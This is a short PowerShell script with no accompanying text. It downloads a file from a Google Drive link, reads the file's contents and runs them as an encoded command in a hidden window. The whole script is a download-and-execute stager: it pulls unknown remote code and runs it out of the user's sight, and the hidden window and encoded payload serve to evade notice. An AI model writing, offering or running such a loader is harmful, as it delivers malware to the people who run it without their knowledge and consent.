$url = "https://drive.google.com/uc?export=download&id=1SSQWxrbQh9LUAxvZO3hQVE5bOC6qygX3"
Invoke-WebRequest -Uri $url -OutFile "file"
$skript = Get-Content -Path .\file
PowerShell.exe -windowstyle hidden -EncodedCommand $skript